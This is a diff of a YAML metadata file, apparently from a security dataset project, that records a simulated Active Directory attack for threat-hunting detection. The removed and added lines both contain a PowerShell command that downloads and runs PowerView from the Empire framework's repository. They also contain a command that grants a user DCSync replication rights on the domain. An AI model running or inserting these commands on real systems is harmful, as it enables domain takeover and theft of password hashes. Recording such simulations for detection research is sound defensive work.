@@ -34,17 +34,13 @@ datasets:
       link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190301-ADModification-ADReplication/DC01_Windows_PCAP.zip
 
 simulation:
-  environment: Blacksmith
-  tools:
-    - type: C2
-      name: Empire
-      module: powerview
-      script: https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1
-  permissions_required:
-    - Domain Admin
-  adversary_view: |-
-    PS C:\Windows\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1')
-    PS C:\Windows\system32> Add-DomainObjectAcl -TargetIdentity "dc=mssentinel,dc=local" -TargetDomain mssentinel.local -PrincipalIdentity nmartha -Rights DCSync
+  executor: PowerShell
+  scriptUri: https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1
+  supportingFileUris:
+  commands: |-
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1')
+    Add-DomainObjectAcl -TargetIdentity "dc=mssentinel,dc=local" -TargetDomain mssentinel.local -PrincipalIdentity nmartha -Rights DCSync
+  output:
 
 detection:
   - project: Threat Hunter Playbook
